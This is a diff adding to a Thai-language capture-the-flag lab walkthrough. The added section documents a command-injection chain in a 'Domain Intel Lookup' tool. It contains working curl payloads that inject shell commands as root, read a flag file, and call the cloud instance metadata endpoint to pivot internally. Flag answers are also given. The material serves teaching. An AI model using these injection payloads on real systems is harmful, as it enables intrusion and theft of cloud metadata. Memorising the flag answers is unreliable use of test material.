@@ -7,6 +7,12 @@ Target จริงบน OCI ไม่ใช่ mock — ทุกคำสั�
 Reserved Public IP แล้ว ไม่เปลี่ยนอีก — ดู [InstructorKey.md](InstructorKey.md)
 ถ้าอยากรู้เหตุผล)
 
+**มี 2 ช่องโหว่แยกอิสระกัน** บนหน้า "Staff Tools" เดียวกัน — ไปจบที่เป้าหมาย
+เดียวกัน (`internal-01`) แต่คนละเส้นทางจริงๆ ไม่ใช่ช่องโหว่เดียวกันแค่ทำ 2 รอบ
+คู่มือนี้เขียนเฉพาะ **Chain A (SSRF)** เต็มรูปแบบ ส่วน **Chain B (Command
+Injection)** สรุปย่อไว้ท้ายไฟล์ — เหมาะสำหรับให้สมาชิกในทีมคนละคนทำคนละ chain
+กัน จะได้ไม่ซ้ำ
+
 ---
 
 ## สถานการณ์
@@ -112,6 +118,50 @@ flag{fd16978f423c836c563079917db6978a}
 
 พร้อม note เพิ่มเติมที่ `/opt/meridian-internal/customer-export-notice.txt`
 บน `internal-01` (อ่านเพื่อความสมบูรณ์ของรายงาน)
+
+---
+
+## Chain B (สรุปย่อ): Command Injection → RCE จริง
+
+คนละช่องโหว่กับด้านบน อยู่ที่เครื่องมือ **"Domain Intel Lookup"** บนหน้า
+Staff Tools เดียวกัน (`/tools/lookup?domain=...`) — รับ domain มาแล้วรัน
+`whois` ผ่าน `shell=True` โดยไม่กรอง input เลย
+
+### ขั้น B1: ยืนยันว่า inject ได้จริง
+```bash
+curl -sG "https://soulsecure.duckdns.org/tools/lookup" \
+  --data-urlencode "domain=example.com; id"
+```
+ผลลัพธ์จะมีทั้ง output ของ `whois` **และ** output ของ `id` — พิสูจน์ว่ารัน
+คำสั่งที่สองได้จริง
+
+### ขั้น B2: เช็คว่าเป็น root
+```bash
+curl -sG "https://soulsecure.duckdns.org/tools/lookup" \
+  --data-urlencode "domain=x; whoami"
+# ควรได้ root -- แอปนี้รันเป็น root จริง (misconfiguration ที่ตั้งใจเก็บไว้)
+```
+
+### ขั้น B3: Flag 2
+```bash
+curl -sG "https://soulsecure.duckdns.org/tools/lookup" \
+  --data-urlencode "domain=x; cat /opt/flag2.txt"
+# flag{e2f73445060fd21acbe97b6794dfbea2}
+```
+
+### ขั้น B4: ไปต่อถึง internal-01 แบบเส้นทางอ้อม (ไม่ต้องใช้ SSRF header trick แล้ว)
+เพราะตอนนี้มี shell จริงแล้ว ไม่ต้องพึ่ง `headers=` param ของ `/preview`
+รัน `curl` เองตรงๆ ได้เลย:
+```bash
+curl -sG "https://soulsecure.duckdns.org/tools/lookup" \
+  --data-urlencode 'domain=x; curl -s -H "Authorization: Bearer Oracle" http://169.254.169.254/opc/v2/instance/metadata/backup_recovery_url'
+```
+จะได้ `backup_recovery_url` ตัวเดียวกับ Chain A — จากนี้ทำขั้นที่ 3-6 ด้านบน
+ต่อได้เลย (ดาวน์โหลด key, หา IP `internal-01`, pivot, อ่าน flag) จบที่ flag
+เดียวกัน: `flag{fd16978f423c836c563079917db6978a}`
+
+ดูเฉลยเต็มของ Chain B (พร้อม remediation/rubric) ที่
+[InstructorKey.md](InstructorKey.md) หัวข้อ "Chain B"
 
 ---
 
